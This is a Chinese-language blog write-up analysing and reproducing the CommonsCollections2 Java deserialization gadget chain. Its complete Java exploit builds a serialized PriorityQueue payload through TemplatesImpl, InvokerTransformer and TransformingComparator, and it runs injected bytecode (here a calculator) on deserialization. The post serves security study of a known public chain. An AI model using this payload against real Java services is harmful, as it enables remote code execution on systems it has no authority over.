---
title: CommonsCollections2
date: 2021-12-22 18:38:12
categories:
- Java
tags:
- Deserialization exploit chain
toc: true
notshow: true
---

# 流程图

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640519227899-221207d5-e591-466d-8654-ec506e97ebe2.jpeg)



# 分析与复现

## 0x00 概述

CC2 与 CC4 最大的区别，就是 CC2 中没有用到 Transformer 数组，而是直接由 compare 调用了 invokeTransformer 执行任意命令。为什么要有这样的差异呢？

一个原因在于参数传递需求的不同：

- CC4 使用 chainedTransformer 进行参数传递，用 ConstantTransformer 将要传递的参数固定住。
- CC2 使用 PriorityQueue，可以将参数以队列元素的形式传递进去，因此不需要 chainedTransformer。

另一个重要的原因在于数组的使用，某些场景下，含有数组的 payload 可能会出现无法正常反序列化的情况（具体可见 shiro550 反序列化漏洞）。

CC4 这一条链忘记了的可以再去阅读：https://dummykitty.github.io/2021/12/22/CommonsCollections4/

### 利用版本

CommonsCollections 4.0

### 限制

JDK版本：暂无限制

## 0x01 触发点

触发点为 ClassLoader.loadClass。

所以在编写 exp 时，这部分的代码不用变，直接粘贴过来即可。

```java
        Path path = Paths.get("C:\\tmp\\Calc2.class");
        byte[] bytes = Files.readAllBytes(path);
        byte[][] bytes1 = {bytes};
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates,bytes1);

        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field classField = TemplatesImpl.class.getDeclaredField("_class");
        classField.setAccessible(true);
        classField.set(templates,null);

        Field tfactoryField = TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());
```

## 0x02 调用链

调用链示意图如下：



![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640519242956-a2979446-748b-4e96-beaf-1de90c1b55e7.png)

我们可以先试一下 invokeTransformer 调用 TemplatesImpl.newTransformer

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class CC2 {
    public static void main(String[] args) throws Exception{
        TestTransformingComparator();
//        unserialize("abc.ser.bin");
    }

    public static void TestTransformingComparator() throws Exception{
        Path path = Paths.get("C:\\tmp\\Calc2.class");
        byte[] bytes = Files.readAllBytes(path);
        byte[][] bytes1 = {bytes};
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates,bytes1);

        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field classField = TemplatesImpl.class.getDeclaredField("_class");
        classField.setAccessible(true);
        classField.set(templates,null);

        Field tfactoryField = TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
        invokerTransformer.transform(templates);
    }
}
```

可以成功弹出计算器。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640159942076-00022b0a-8853-4224-be6f-efccce68c6a5.png)

将 chainedTransformer 和后续的 PriorityQueue 加上：

最终 exp：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) throws Exception{
//        TestTransformingComparator();
        unserialize("abc.ser.bin");
    }

    public static void TestTransformingComparator() throws Exception{
        Path path = Paths.get("C:\\tmp\\Calc2.class");
        byte[] bytes = Files.readAllBytes(path);
        byte[][] bytes1 = {bytes};
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates,bytes1);

        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field classField = TemplatesImpl.class.getDeclaredField("_class");
        classField.setAccessible(true);
        classField.set(templates,null);

        Field tfactoryField = TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
        
        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer, null);
        PriorityQueue priorityQueue = new PriorityQueue();

        Field comparatorField = PriorityQueue.class.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue,null);
        priorityQueue.add("1");
        priorityQueue.add("2");

        setFieldValue(priorityQueue,"queue",new Object[]{templates,templates});

        comparatorField.set(priorityQueue,transformingComparator);
        serialize(priorityQueue);

    }

    public static void serialize(Object o) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("abc.ser.bin"));
        oos.writeObject(o);
    }

    public static void unserialize(String filePath) throws Exception{
        ObjectInputStream ins = new ObjectInputStream(new FileInputStream(filePath));
        ins.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

# 参考资料

- [Java反序列化CommonsCollections篇(四)-摆烂的完结篇](https://www.bilibili.com/video/BV1NQ4y1q7EU?spm_id_from=333.999.0.0)
- [ysoserial](https://github.com/frohoff/ysoserial)

- [Commons-Collections 1-7 利用链分析](http://wjlshare.com/archives/1535)